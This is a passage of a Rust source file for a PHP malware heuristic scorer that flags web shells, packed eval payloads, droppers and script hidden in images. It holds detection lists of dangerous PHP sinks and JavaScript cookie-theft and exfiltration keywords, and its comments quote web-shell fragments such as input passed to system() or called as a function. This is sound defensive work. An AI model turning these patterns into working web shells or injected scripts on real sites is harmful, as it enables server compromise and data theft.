//! PHP malware heuristic scorer.
//!
//! A pragmatic byte scorer, not a PHP parser. The aim is a *low false-positive
//! rate on legitimate code* first (a "malicious" verdict can be auto-quarantined
//! by `sn clean`, and a quarantined WordPress core file breaks a site), and
//! detection of the common web-shell shapes second.
//!
//! What that means in practice:
//! * A dangerous call only counts when it is a **bare call** (`name(`): not a
//!   longer identifier (`WP_Filesystem(` is not `system(`), not a method or
//!   static call (`$pdo->exec(`), not a definition (`function exec(`).
//! * Request input only counts when it is **inside the call's arguments**, or in
//!   a variable that was assigned from request input. "Appears somewhere nearby"
//!   is how WordPress's own callback dispatch (`call_user_func( $cb )` next to a
//!   `$_POST` check) used to be flagged.
//! * Direct input→call and input-called-as-a-function are **malicious** on their
//!   own. Indirect evidence (a variable assigned from input, one decoder, an
//!   encoded blob) is only **suspicious** by itself: reported for a human, never
//!   auto-quarantined. Several independent signs together (for example a packed
//!   `eval(gzinflate(base64_decode(...)))` with a large blob) can still add up.
//!
//! Scoring: `>= 70` suspicious, `>= 100` malicious. Commercial encoders
//! (ionCube/SourceGuardian/Zend) get their own class and are not scored on
//! entropy.
//!
//! Detection needles are built from fragments at load time. This only keeps the
//! *source file* free of contiguous byte strings that a host anti-virus would
//! quarantine as a web-shell signature; it has no effect on behaviour.
//!
//! Tune against real code with `cargo run -p snsec-common --release --example
//! scan_dir -- <dir>` (WordPress core + popular plugins is the regression set).

use std::sync::LazyLock;

/// Version of the scoring rules, recorded in every scan result. A result made by
/// an older version is dropped after an upgrade instead of being reported or
/// acted on: version 1 scored pictures with the PHP rules and called ordinary
/// photos "malicious" (a few bytes of compressed data that spell `<?=`, plus the
/// weight of a picture in `uploads`); version 2 still called a library's comment
/// (`phpQuery`) and PHPUnit's phar "malicious". Raise it whenever a change to the
/// rules would make an earlier result misleading.
pub const SCORER_VERSION: u32 = 3;

fn s(parts: &[&str]) -> String {
    parts.concat()
}

/// Superglobals / request-controlled inputs (lowercased).
static SOURCES: LazyLock<Vec<String>> = LazyLock::new(|| {
    vec![
        s(&["$_", "post"]),
        s(&["$_", "get"]),
        s(&["$_", "request"]),
        s(&["$_", "cookie"]),
        s(&["$_", "server"]),
        s(&["$_", "files"]),
        s(&["php://", "input"]),
        s(&["$http_", "raw_post_data"]),
    ]
});

/// Calls that run code or commands.
static SINKS: LazyLock<Vec<String>> = LazyLock::new(|| {
    vec![
        s(&["ev", "al("]),
        s(&["ass", "ert("]),
        s(&["sys", "tem("]),
        s(&["ex", "ec("]),
        s(&["shell_", "exec("]),
        s(&["pass", "thru("]),
        s(&["po", "pen("]),
        s(&["proc_", "open("]),
        s(&["pcntl_", "exec("]),
        s(&["create_", "function("]),
        s(&["call_user_", "func("]),
        s(&["call_user_", "func_array("]),
    ]
});

/// Commands that are suspicious to merely be present (weak, additive).
static COMMAND_SINKS: LazyLock<Vec<String>> = LazyLock::new(|| {
    vec![
        s(&["sys", "tem("]),
        s(&["shell_", "exec("]),
        s(&["pass", "thru("]),
        s(&["proc_", "open("]),
    ]
});

static DECODERS: LazyLock<Vec<String>> = LazyLock::new(|| {
    vec![
        s(&["base64_", "decode"]),
        "gzinflate".into(),
        "gzuncompress".into(),
        s(&["str_", "rot13"]),
        "strrev".into(),
        "hex2bin".into(),
        "convert_uudecode".into(),
    ]
});

static ENCODERS: &[&str] = &["ioncube", "sourceguardian", "zend optimizer", "zendengine"];

/// A single rule that fired, with its weight, for reporting.
#[derive(Debug, Clone)]
pub struct Hit {
    pub rule: &'static str,
    pub weight: u32,
}

#[derive(Debug, Clone)]
pub struct Score {
    pub score: u32,
    pub verdict: Verdict,
    pub hits: Vec<Hit>,
    /// A short excerpt around the first strong hit.
    pub context: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    Clean,
    Suspicious,
    Malicious,
    EncodedCommercial,
}

impl Verdict {
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Verdict::Clean => "clean",
            Verdict::Suspicious => "suspicious",
            Verdict::Malicious => "malicious",
            Verdict::EncodedCommercial => "encoded-commercial",
        }
    }
}

// ---------------------------------------------------------------------------
// Small scanners
// ---------------------------------------------------------------------------

fn is_ident(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

fn contains_any(hay: &[u8], needles: &[String]) -> bool {
    needles
        .iter()
        .any(|n| memchr::memmem::find(hay, n.as_bytes()).is_some())
}

/// Offsets just past the `(` of every **bare call** to `needle` (which ends in
/// `(`): not the tail of a longer identifier, not a method/static call, not a
/// function definition.
fn bare_calls(low: &[u8], needle: &str) -> Vec<usize> {
    memchr::memmem::find_iter(low, needle.as_bytes())
        .filter(|&off| {
            if let Some(&prev) = off.checked_sub(1).and_then(|i| low.get(i)) {
                // `WP_Filesystem(`, `$o->exec(`, `Foo::exec(`, `$exec(`.
                if is_ident(prev) || matches!(prev, b'>' | b':' | b'$') {
                    return false;
                }
            }
            // `function exec(` declares, it does not call.
            let before = &low[off.saturating_sub(9)..off];
            !before.ends_with(b"function ")
        })
        .map(|off| off + needle.len())
        .collect()
}

/// The argument text of a call: from just after `(` to the `)` that closes it,
/// the end of the statement (`;`) or 240 bytes, whichever comes first. A bracket
/// inside quotes does not count, so `system(")" . $_GET[0])` is read whole; and
/// what follows the call, as in `call_user_func($f) : ($_SERVER['x'] ?? 0)`, is
/// not one of its arguments.
fn args_window(low: &[u8], start: usize) -> &[u8] {
    let end = (start + 240).min(low.len());
    let w = &low[start..end];
    let mut depth = 0usize;
    let mut i = 0;
    while i < w.len() {
        match w[i] {
            q @ (b'\'' | b'"') => {
                i += 1;
                while i < w.len() && w[i] != q {
                    if w[i] == b'\\' {
                        i += 1;
                    }
                    i += 1;
                }
            }
            b'(' => depth += 1,
            b')' => {
                if depth == 0 {
                    return &w[..i];
                }
                depth -= 1;
            }
            b';' => return &w[..i],
            _ => {}
        }
        i += 1;
    }
    w
}

/// Names of variables assigned directly from request input
/// (`$cmd = $_GET['c'];`), and whether it was decoded on the way. Capped so a
/// hostile file cannot make this expensive.
fn tainted_vars(low: &[u8]) -> Vec<(Vec<u8>, bool)> {
    let mut out: Vec<(Vec<u8>, bool)> = Vec::new();
    let mut i = 0;
    while let Some(rel) = memchr::memchr(b'$', &low[i..]) {
        let start = i + rel + 1;
        let mut j = start;
        while j < low.len() && is_ident(low[j]) {
            j += 1;
        }
        i = j.max(start);
        if j == start {
            continue;
        }
        let mut k = j;
        while k < low.len() && matches!(low[k], b' ' | b'\t') {
            k += 1;
        }
        // A plain `=`: not `==`, `===`, `=>`.
        if low.get(k) != Some(&b'=') || matches!(low.get(k + 1), Some(b'=' | b'>')) {
            continue;
        }
        let name = &low[start..j];
        if let Some(decoded) = assigned_from_input(&low[k + 1..(k + 201).min(low.len())])
            && !out.iter().any(|(n, _)| n == name)
        {
            out.push((name.to_vec(), decoded));
            if out.len() >= 64 {
                break;
            }
        }
    }
    out
}

/// Native PHP functions that merely tidy or decode a value, so the result is
/// still the attacker's data. Sanitizers (`intval`, `sanitize_*`, `esc_*`) are
/// deliberately absent: a sanitized value is not a command.
const PASS_THROUGH: &[&[u8]] = &[
    b"trim",
    b"ltrim",
    b"rtrim",
    b"stripslashes",
    b"urldecode",
    b"rawurldecode",
    b"base64_decode",
    b"strval",
    b"hex2bin",
    b"gzinflate",
    b"str_rot13",
    b"strrev",
    b"html_entity_decode",
    b"htmlspecialchars_decode",
];

/// Functions that hide what they are given: input passed through one of them and
/// then to a command is the shape of a web shell that takes its command encoded.
const DECODING: &[&[u8]] = &[
    b"base64_decode",
    b"hex2bin",
    b"gzinflate",
    b"str_rot13",
    b"strrev",
];

/// Does the right-hand side of an assignment *begin with* request input, bare or
/// through pass-through functions: `$_GET['c']`, `trim($_POST['c'])`,
/// `trim(base64_decode($_POST['c']))`? Starting with is the point:
/// `isset($_GET['x']) ? 1 : 2` is a check, not a hand-over. `Some(true)` when
/// a decoding function was on the way.
fn assigned_from_input(rhs: &[u8]) -> Option<bool> {
    let skip = |s: &[u8]| -> usize {
        s.iter()
            .take_while(|b| matches!(**b, b' ' | b'\t' | b'@'))
            .count()
    };
    let mut cur = &rhs[skip(rhs)..];
    let mut decoded = false;
    // A few wrappers at most.
    for _ in 0..4 {
        if SOURCES.iter().any(|n| cur.starts_with(n.as_bytes())) {
            return Some(decoded);
        }
        let name_len = cur.iter().take_while(|&&b| is_ident(b)).count();
        if name_len == 0
            || cur.get(name_len) != Some(&b'(')
            || !PASS_THROUGH.contains(&&cur[..name_len])
        {
            return None;
        }
        decoded |= DECODING.contains(&&cur[..name_len]);
        let inner = &cur[name_len + 1..];
        cur = &inner[skip(inner)..];
    }
    None
}

/// Does an argument use one of the tainted variables as a *value*? A variable
/// used as an array key (`$registry[ $name ]`) is a lookup in a fixed table, not
/// a hand-over, so it does not count. `Some(decoded)` for the first one found.
fn tainted_use(args: &[u8], tainted: &[(Vec<u8>, bool)]) -> Option<bool> {
    tainted.iter().find_map(|(name, decoded)| {
        let mut pat = Vec::with_capacity(name.len() + 1);
        pat.push(b'$');
        pat.extend_from_slice(name);
        memchr::memmem::find_iter(args, &pat)
            .any(|p| {
                if args.get(p + pat.len()).is_some_and(|&b| is_ident(b)) {
                    return false; // `$cmdline` is not `$cmd`
                }
                let before = args[..p].iter().rev().find(|b| !b.is_ascii_whitespace());
                before != Some(&b'[')
            })
            .then_some(*decoded)
    })
}

/// What follows the `(` of `$_GET['f'](`: the start of an argument list, not
/// prose in a comment (`... means $_SERVER['HTTP_HOST'] (if any)`).
fn looks_like_call_args(rest: &[u8]) -> bool {
    let rest = rest.trim_ascii_start();
    match rest.first() {
        None => true,
        Some(b'$' | b'\'' | b'"' | b')' | b'@' | b'&' | b'(' | b'[' | b'-' | b'!' | b'\\') => true,
        Some(c) if c.is_ascii_digit() => true,
        // A word is an argument only as a call: `trim(...)`, not `(if any)`.
        Some(_) => {
            let n = rest.iter().take_while(|&&b| is_ident(b)).count();
            n > 0 && rest.get(n) == Some(&b'(')
        }
    }
}

/// `$_POST['f'](...)`: request input used as the *name of the function to call*.
fn input_called_as_function(low: &[u8]) -> Option<usize> {
    for src in SOURCES.iter().filter(|x| x.starts_with("$_")) {
        for off in memchr::memmem::find_iter(low, src.as_bytes()) {
            let from = off + src.len();
            let tail = &low[from..(from + 80).min(low.len())];
            let Some(close) = memchr::memchr(b']', tail) else {
                continue;
            };
            // The bracket holds a plain key: no calls, no statements.
            if close > 40
                || tail[..close]
                    .iter()
                    .any(|b| matches!(b, b'(' | b')' | b';'))
            {
                continue;
            }
            let mut k = close + 1;
            while k < tail.len() && tail[k] == b' ' {
                k += 1;
            }
            if tail.get(k) == Some(&b'(') && looks_like_call_args(&tail[k + 1..]) {
                return Some(off);
            }
        }
    }
    None
}

/// `preg_replace` whose pattern carries the `e` modifier (evaluates the
/// replacement as code). Only a real pattern string counts: not
/// `preg_replace_callback(`, and not the letters `/e` somewhere in a name.
fn preg_replace_e(low: &[u8]) -> Option<usize> {
    let check = |after: usize| -> Option<bool> {
        let mut i = after;
        while low.get(i).is_some_and(|b| b.is_ascii_whitespace()) {
            i += 1;
        }
        let quote = *low.get(i)?;
        if quote != b'\'' && quote != b'"' {
            return Some(false);
        }
        i += 1;
        let window = &low[i..(i + 200).min(low.len())];
        let end = window.iter().position(|&b| b == quote)?;
        let pat = &window[..end];
        let delim = *pat.first()?;
        if delim.is_ascii_alphanumeric() {
            return Some(false);
        }
        let last = pat.iter().rposition(|&b| b == delim)?;
        if last == 0 {
            return Some(false);
        }
        let mods = &pat[last + 1..];
        Some(mods.contains(&b'e') && mods.iter().all(u8::is_ascii_alphabetic))
    };
    bare_calls(low, "preg_replace(")
        .into_iter()
        .find(|&after| check(after) == Some(true))
}

// ---------------------------------------------------------------------------
// Scoring
// ---------------------------------------------------------------------------

/// Score a PHP file's bytes. `is_upload` / `is_image_ext` raise weights for
/// code found where it should never be.
#[must_use]
pub fn score_php(content: &[u8], is_upload: bool, is_image_ext: bool) -> Score {
    // Case-insensitive detection copy; context is taken from the original.
    let low: Vec<u8> = content.iter().map(u8::to_ascii_lowercase).collect();
    let mut hits: Vec<Hit> = Vec::new();
    let mut score: u32 = 0;
    let mut strong_offset: Option<usize> = None;
    let mut add = |rule: &'static str, weight: u32, offset: Option<usize>| {
        score += weight;
        hits.push(Hit { rule, weight });
        if let (Some(off), None) = (offset, strong_offset) {
            strong_offset = Some(off);
        }
    };

    let is_encoder = ENCODERS
        .iter()
        .any(|e| memchr::memmem::find(&low, e.as_bytes()).is_some());

    // 1) Request input passed straight into a code/command call.
    let tainted = tainted_vars(&low);
    let mut direct: Option<usize> = None;
    // (offset, rule, weight) of the strongest use of a tainted variable.
    let mut via_var: Option<(usize, &'static str, u32)> = None;
    for sink in SINKS.iter() {
        // For call_user_func*, only the FIRST argument (the function to run)
        // matters; the rest is data handed to a callback, which legitimate code
        // does with form values all the time.
        let callback_style = sink.starts_with("call_user_");
        // The sinks that run a command, not code.
        let command = !(sink.starts_with("ev")
            || sink.starts_with("ass")
            || sink.starts_with("create_")
            || callback_style);
        for after in bare_calls(&low, sink) {
            let mut args = args_window(&low, after);
            if callback_style && let Some(comma) = memchr::memchr(b',', args) {
                args = &args[..comma];
            }
            if direct.is_none() && contains_any(args, &SOURCES) {
                direct = Some(after);
            } else if let Some(decoded) = tainted_use(args, &tainted) {
                // Input decoded on its way to a command, or a command that
                // folds its errors into its output (`2>&1`) so a web page can
                // show them: a shell. Anything else is only probably one.
                let (rule, weight) = if decoded {
                    ("decoded-to-sink", 100)
                } else if command && memchr::memmem::find(args, b"2>&1").is_some() {
                    ("tainted-command-capture", 100)
                } else {
                    ("tainted-to-sink", 70)
                };
                if via_var.is_none_or(|(_, _, w)| weight > w) {
                    via_var = Some((after, rule, weight));
                }
            }
        }
    }
    if let Some(off) = direct {
        add("source-to-sink", 100, Some(off));
    } else if let Some((off, rule, weight)) = via_var {
        // The weaker case is probably a shell, but legitimate code does this
        // too (a backup plugin running a command built from a form field). On
        // its own it lands at "suspicious": reported for a human, never
        // auto-quarantined.
        add(rule, weight, Some(off));
    }

    // 2) `$_POST['f'](...)`: the request chooses which function runs.
    if let Some(off) = input_called_as_function(&low) {
        add("input-as-function", 100, Some(off));
    }

    // 3) Decoders feeding eval/assert: the classic packed web shell.
    for sink in [s(&["ev", "al("]), s(&["ass", "ert("])] {
        for after in bare_calls(&low, &sink) {
            let win = &low[after..(after + 200).min(low.len())];
            let n = DECODERS
                .iter()
                .filter(|d| memchr::memmem::find(win, d.as_bytes()).is_some())
                .count();
            if n >= 1 {
                add(
                    "decode-into-eval",
                    if n >= 2 { 80 } else { 60 },
                    Some(after),
                );
                break;
            }
        }
    }

    // 4) preg_replace with the e modifier.
    if let Some(off) = preg_replace_e(&low) {
        add("preg_replace-e", 60, Some(off));
    }

    // 5) A bare command call is weak evidence on its own.
    if COMMAND_SINKS
        .iter()
        .any(|n| !bare_calls(&low, n).is_empty())
    {
        add("command-sink", 20, None);
    }

    // 6) Dropper / uploader: writes request data or fetched content to disk.
    let fetch_single = s(&["file_get_contents('", "http"]);
    let fetch_double = s(&["file_get_contents(\"", "http"]);
    for name in [
        s(&["move_", "uploaded_file("]),
        s(&["file_put_", "contents("]),
        s(&["fw", "rite("]),
    ] {
        let Some(after) = bare_calls(&low, &name).first().copied() else {
            continue;
        };
        if memchr::memmem::find(&low, fetch_single.as_bytes()).is_some()
            || memchr::memmem::find(&low, fetch_double.as_bytes()).is_some()
            || contains_any(args_window(&low, after), &SOURCES)
        {
            add("dropper", 40, Some(after));
            break;
        }
    }

    // 7) Variable-variable built from string pieces: ${'_PO'.'ST'}.
    if memchr::memmem::find(&low, b"${'").is_some() || memchr::memmem::find(&low, b"${\"").is_some()
    {
        add("obfuscated-variable", 20, None);
    }

    if !is_encoder {
        // 8) A long base64 blob in a small file.
        if let Some(off) = longest_b64_run(content) {
            let run = base64_run_len(content, off);
            if run > 512 {
                add(
                    "long-base64",
                    if content.len() < 20_000 { 30 } else { 15 },
                    Some(off),
                );
            }
        }
        // 9) Entropy of a long string literal.
        if high_entropy_literal(content) {
            add("high-entropy-literal", 25, None);
        }
    }

    // 10) Placement: code where only media should be.
    if is_image_ext {
        add("php-in-image-ext", 50, None);
    }
    if is_upload {
        add("php-in-uploads", 40, None);
    }

    let verdict = if is_encoder && score < 70 {
        Verdict::EncodedCommercial
    } else if score >= 100 {
        Verdict::Malicious
    } else if score >= 70 {
        Verdict::Suspicious
    } else {
        Verdict::Clean
    };

    let context = strong_offset
        .map(|off| snippet(content, off))
        .unwrap_or_default();

    Score {
        score,
        verdict,
        hits,
        context,
    }
}

/// Rules that, each on its own, show request input reaching code or a command.
const STRONG_RULES: &[&str] = &[
    "source-to-sink",
    "input-as-function",
    "decode-into-eval",
    "preg_replace-e",
    "decoded-to-sink",
    "tainted-command-capture",
];

/// A file of test tooling (PHPUnit and its phar run commands by design) is not
/// called "malicious" on weak signs added together (a command call, a variable
/// that came from `$_SERVER`, a write to disk): that verdict makes `sn clean`
/// quarantine it. It stays "suspicious", so a person still sees it. With a
/// strong rule it keeps its verdict.
pub fn cap_without_strong_rule(score: &mut Score) {
    if score.verdict == Verdict::Malicious
        && !score.hits.iter().any(|h| STRONG_RULES.contains(&h.rule))
    {
        score.verdict = Verdict::Suspicious;
        score.score = score.score.min(99);
        score.hits.push(Hit {
            rule: "known-dev-tool",
            weight: 0,
        });
    }
}

fn is_b64(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'='
}

fn longest_b64_run(content: &[u8]) -> Option<usize> {
    let mut best_start = 0usize;
    let mut best_len = 0usize;
    let mut cur_start = 0usize;
    let mut cur_len = 0usize;
    for (i, &b) in content.iter().enumerate() {
        if is_b64(b) {
            if cur_len == 0 {
                cur_start = i;
            }
            cur_len += 1;
        } else {
            if cur_len > best_len {
                best_len = cur_len;
                best_start = cur_start;
            }
            cur_len = 0;
        }
    }
    if cur_len > best_len {
        best_len = cur_len;
        best_start = cur_start;
    }
    if best_len > 0 { Some(best_start) } else { None }
}

fn base64_run_len(content: &[u8], start: usize) -> usize {
    content[start..].iter().take_while(|&&b| is_b64(b)).count()
}

/// Shannon entropy over the longest contiguous printable string literal; true
/// when a >256-byte literal exceeds ~5.2 bits/byte.
fn high_entropy_literal(content: &[u8]) -> bool {
    let mut best: &[u8] = &[];
    let mut start = 0usize;
    let mut inside = false;
    for (i, &b) in content.iter().enumerate() {
        let printable = (0x20..0x7f).contains(&b);
        if printable {
            if !inside {
                inside = true;
                start = i;
            }
        } else if inside {
            inside = false;
            if i - start > best.len() {
                best = &content[start..i];
            }
        }
    }
    if inside && content.len() - start > best.len() {
        best = &content[start..];
    }
    if best.len() < 256 {
        return false;
    }
    let mut counts = [0u32; 256];
    for &b in best {
        counts[b as usize] += 1;
    }
    let len = best.len() as f64;
    let mut h = 0.0f64;
    for &c in &counts {
        if c > 0 {
            let p = c as f64 / len;
            h -= p * p.log2();
        }
    }
    h > 5.2
}

fn snippet(content: &[u8], off: usize) -> String {
    let start = off.saturating_sub(40);
    let end = (off + 120).min(content.len());
    let s = String::from_utf8_lossy(&content[start..end]);
    s.replace(['\n', '\r'], " ").chars().take(160).collect()
}

// ---------------------------------------------------------------------------
// Images, and files that only carry an image's name
// ---------------------------------------------------------------------------
//
// A picture is a good hiding place: nothing looks at it, and one line in
// `.htaccess` (or `.user.ini`) makes the web server run it as code. So the
// scorer answers three questions about a file named like an image:
//   * is it really a picture (by its first bytes, not by its name)?
//   * is there code in it (a PHP open tag, a script, an event handler)?
//   * is there something after the end of the picture?
// and a second one about the files that turn pictures into code.
//
// Random bytes in compressed picture data spell short strings by chance, so
// nothing here trusts a bare `<?=` or a bare `eval(`: a PHP open tag must be
// followed by text that reads like code, and script words only count where a
// script (tag, handler, `javascript:`) is present.

/// Extensions that are pictures, shared by the scanner and its tests.
pub const IMAGE_EXTS: &[&str] = &[
    "jpg", "jpeg", "jpe", "jfif", "png", "gif", "webp", "bmp", "ico", "cur", "svg", "tif", "tiff",
    "avif", "heic", "heif",
];

/// Extensions of files that hold plain data; mapping them to a code handler
/// is as wrong as mapping a picture.
const DATA_EXTS: &[&str] = &[
    "txt", "css", "js", "json", "xml", "csv", "log", "ini", "pdf", "zip", "mp3", "mp4", "woff",
    "woff2", "ttf",
];

/// Extensions a server runs as PHP.
const PHP_LIKE_EXTS: &[&str] = &[
    "php", "phtml", "php3", "php4", "php5", "php6", "php7", "php8", "pht", "phtm", "phar", "phps",
];

/// Name parts that make `x.<part>.jpg` run as a script on a server that maps
/// the extension anywhere in the file name.
const SCRIPT_NAME_PARTS: &[&str] = &[
    "php", "phtml", "php3", "php4", "php5", "php6", "php7", "php8", "pht", "phtm", "phar", "phps",
    "cgi", "pl", "py", "sh", "asp", "aspx", "jsp",
];

/// Script words that hide or run a payload.
static JS_OBFUSCATION: LazyLock<Vec<String>> = LazyLock::new(|| {
    vec![
        s(&["ev", "al("]),
        "atob(".into(),
        "fromcharcode".into(),
        "unescape(".into(),
        "document.write(".into(),
        "new function(".into(),
    ]
});

/// Script words that steal data or send the visitor elsewhere.
const JS_EXFIL_REDIRECT: &[&str] = &[
    "document.cookie",
    "localstorage",
    "window.location",
    "location.href",
    "location.replace",
    "document.location",
    "xmlhttprequest",
    "fetch(",
    "sendbeacon",
];

/// Event names that, as an attribute, run script on a picture or page.
const EVENT_NAMES: &[&[u8]] = &[
    b"load",
    b"error",
    b"click",
    b"mouseover",
    b"mouseenter",
    b"mouseout",
    b"mousedown",
    b"mousemove",
    b"focus",
    b"focusin",
    b"begin",
    b"end",
    b"repeat",
    b"activate",
    b"animationstart",
    b"animationend",
    b"toggle",
    b"pointerover",
    b"pointerenter",
    b"loadstart",
    b"unload",
    b"submit",
    b"input",
    b"change",
    b"keydown",
    b"keyup",
    b"scroll",
    b"wheel",
    b"resize",
];

/// What a file's first bytes say it is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Kind {
    /// A raster picture: JPEG, PNG, GIF, WebP, BMP, ICO, TIFF, HEIF/AVIF.
    Image,
    /// Vector markup: it is text, so it can carry script.
    Svg,
    /// ELF, Windows executable, or a `#!` script.
    Executable,
    /// zip, rar, gzip, 7z.
    Archive,
    /// Plain text: a page, a script, a stub.
    Text,
    /// Binary that is none of the above (a damaged picture, a rare format).
    Other,
}

fn is_text_byte(b: u8) -> bool {
    matches!(b, b'\t' | b'\n' | b'\r' | 0x20..=0x7e)
}

/// At least 9 in 10 of the first KB are plain text and there is no NUL.
fn looks_like_text(sample: &[u8]) -> bool {
    let sample = &sample[..sample.len().min(1024)];
    if sample.len() < 16 || sample.contains(&0) {
        return false;
    }
    let text = sample.iter().filter(|&&b| is_text_byte(b)).count();
    text * 10 >= sample.len() * 9
}

fn sniff(content: &[u8]) -> Kind {
    let h = content;
    let starts = |p: &[u8]| h.starts_with(p);
    if starts(&[0xFF, 0xD8, 0xFF])
        || starts(&[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A])
        || starts(b"GIF87a")
        || starts(b"GIF89a")
        || (h.len() >= 12 && &h[..4] == b"RIFF" && &h[8..12] == b"WEBP")
        || (h.len() >= 14 && &h[..2] == b"BM" && h[6..10] == [0, 0, 0, 0])
        || starts(&[0, 0, 1, 0])
        || starts(&[0, 0, 2, 0])
        || starts(&[b'I', b'I', 0x2A, 0])
        || starts(&[b'M', b'M', 0, 0x2A])
        || (h.len() >= 12 && &h[4..8] == b"ftyp")
    {
        return Kind::Image;
    }
    if starts(b"\x7fELF")
        || starts(b"#!")
        || (starts(b"MZ") && memchr::memmem::find(&h[..h.len().min(1024)], b"PE\0\0").is_some())
    {
        return Kind::Executable;
    }
    if starts(b"PK\x03\x04")
        || starts(b"Rar!")
        || starts(&[0x1F, 0x8B])
        || starts(&[b'7', b'z', 0xBC, 0xAF, 0x27, 0x1C])
    {
        return Kind::Archive;
    }
    if looks_like_text(h) {
        let head: Vec<u8> = h[..h.len().min(4096)].to_ascii_lowercase();
        return if memchr::memmem::find(&head, b"<svg").is_some() {
            Kind::Svg
        } else {
            Kind::Text
        };
    }
    Kind::Other
}

/// Offset of the first PHP open tag that is followed by something that reads as
/// code, in lowercased bytes. `allow_short` also accepts `<?` + whitespace, only
/// safe in text: in picture data, `<?` and a space can be chance.
fn find_php_open_low(low: &[u8], allow_short: bool) -> Option<usize> {
    for off in memchr::memmem::find_iter(low, b"<?") {
        let rest = &low[off + 2..];
        let skip =
            if rest.starts_with(b"php") && rest.get(3).is_some_and(|b| b.is_ascii_whitespace()) {
                4
            } else if rest.starts_with(b"=")
                || (allow_short && rest.first().is_some_and(|b| b.is_ascii_whitespace()))
            {
                1
            } else {
                continue;
            };
        // The text that runs on from the tag: code is text, picture data is
        // not, so a tag met by chance is followed by a few bytes at most.
        let code = &rest[skip..];
        let run = code.iter().take_while(|&&b| is_text_byte(b)).count();
        let short_tag = skip == 1;
        let need = if short_tag { 8 } else { 4 };
        if run < need.min(code.len()) || run == 0 {
            continue;
        }
        // `<?=` and `<? ` are two or three bytes, and a handful of text bytes
        // follow them by chance now and then in 200,000 pictures: also ask for
        // a statement (`<?=`: a variable or a call) that ends (`;` or `?>`).
        if short_tag {
            let c = &code[..run];
            let ends = c.contains(&b';') || memchr::memmem::find(c, b"?>").is_some();
            let statement = !rest.starts_with(b"=") || c.iter().any(|&b| b == b'$' || b == b'(');
            if !(ends && statement) {
                continue;
            }
        }
        return Some(off);
    }
    for tag in [
        &b"<script language=\"php\""[..],
        &b"<script language='php'"[..],
    ] {
        if let Some(off) = memchr::memmem::find(low, tag) {
            return Some(off);
        }
    }
    None
}

/// Does the file hold a PHP open tag followed by code? For the files the
/// scanner opens only because they changed recently, not because of their name.
#[must_use]
pub fn has_php_marker(content: &[u8]) -> bool {
    let low: Vec<u8> = content.iter().map(u8::to_ascii_lowercase).collect();
    find_php_open_low(&low, true).is_some()
}

/// The score under construction, with the offset of its strongest hit.
#[derive(Default)]
struct Acc {
    score: u32,
    hits: Vec<Hit>,
    offset: Option<usize>,
    context: String,
}

impl Acc {
    fn add(&mut self, rule: &'static str, weight: u32, offset: Option<usize>) {
        self.score += weight;
        self.hits.push(Hit { rule, weight });
        if self.offset.is_none() {
            self.offset = offset;
        }
    }

    fn finish(self, content: &[u8]) -> Score {
        let verdict = if self.score >= 100 {
            Verdict::Malicious
        } else if self.score >= 70 {
            Verdict::Suspicious
        } else {
            Verdict::Clean
        };
        let context = if self.context.is_empty() {
            self.offset
                .map(|off| masked_snippet(content, off))
                .unwrap_or_default()
        } else {
            self.context
        };
        Score {
            score: self.score,
            verdict,
            hits: self.hits,
            context,
        }
    }
}

/// An excerpt in which anything that is not text (picture data) is a space.
fn masked_snippet(content: &[u8], off: usize) -> String {
    let start = off.saturating_sub(40);
    let end = (off + 120).min(content.len());
    let text: String = content[start..end]
        .iter()
        .map(|&b| if is_text_byte(b) { b as char } else { ' ' })
        .collect();
    text.split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .chars()
        .take(160)
        .collect()
}

/// The bytes from `off` on with everything that is not text turned into a
/// space, so the PHP scorer sees the code and not the picture around it.
fn text_segment(content: &[u8], off: usize, max: usize) -> Vec<u8> {
    content[off..(off + max).min(content.len())]
        .iter()
        .map(|&b| if is_text_byte(b) { b } else { b' ' })
        .collect()
}

/// `x.php.jpg`: a script name part before the picture extension.
fn double_extension(name: &str) -> bool {
    let parts: Vec<&str> = name.split('.').collect();
    parts.len() >= 3
        && parts[1..parts.len() - 1]
            .iter()
            .any(|p| SCRIPT_NAME_PARTS.contains(p))
}

/// ` onload=`, ` onerror=` and the like: an attribute that runs script.
fn event_handler(low: &[u8]) -> Option<usize> {
    for off in memchr::memmem::find_iter(low, b"on") {
        let Some(&prev) = off.checked_sub(1).and_then(|i| low.get(i)) else {
            continue;
        };
        if !(prev.is_ascii_whitespace() || matches!(prev, b'"' | b'\'' | b'/')) {
            continue;
        }
        let name_len = low[off + 2..]
            .iter()
            .take_while(|b| b.is_ascii_lowercase())
            .count();
        if name_len == 0 || name_len > 16 {
            continue;
        }
        if !EVENT_NAMES.contains(&&low[off + 2..off + 2 + name_len]) {
            continue;
        }
        let mut k = off + 2 + name_len;
        while low.get(k).is_some_and(|b| b.is_ascii_whitespace()) {
            k += 1;
        }
        if low.get(k) == Some(&b'=') {
            return Some(off);
        }
    }
    None
}

/// A `<script>` that loads its code from another address.
fn remote_script(low: &[u8]) -> bool {
    memchr::memmem::find_iter(low, b"<script")
        .take(32)
        .any(|off| {
            let w = &low[off..(off + 400).min(low.len())];
            let has = |n: &[u8]| memchr::memmem::find(w, n).is_some();
            (has(b"src=") || has(b"href=")) && (has(b"http:") || has(b"https:") || has(b"//"))
        })
}

/// Script found in a picture or page: tags, handlers, `javascript:`, and, only
/// when one of those is there, the words that hide a payload or move a visitor.
fn score_markup(acc: &mut Acc, low: &[u8]) {
    let find = |n: &[u8]| memchr::memmem::find(low, n);
    let mut in_code = false;
    if let Some(off) = find(b"<script") {
        acc.add("script-in-image", 40, Some(off));
        in_code = true;
        if remote_script(low) {
            acc.add("remote-script", 40, Some(off));
        }
    }
    if let Some(off) = event_handler(low) {
        acc.add("event-handler-in-image", 30, Some(off));
        in_code = true;
    }
    if let Some(off) = find(b"javascript:") {
        acc.add("javascript-uri", 50, Some(off));
        in_code = true;
    }
    if let Some(off) = [&b"<foreignobject"[..], b"<iframe", b"<embed", b"<object"]
        .iter()
        .find_map(|n| find(n))
    {
        acc.add("embedded-frame", 30, Some(off));
    }
    if let Some(off) = find(b"data:text/html") {
        acc.add("data-html-uri", 40, Some(off));
    }
    if in_code {
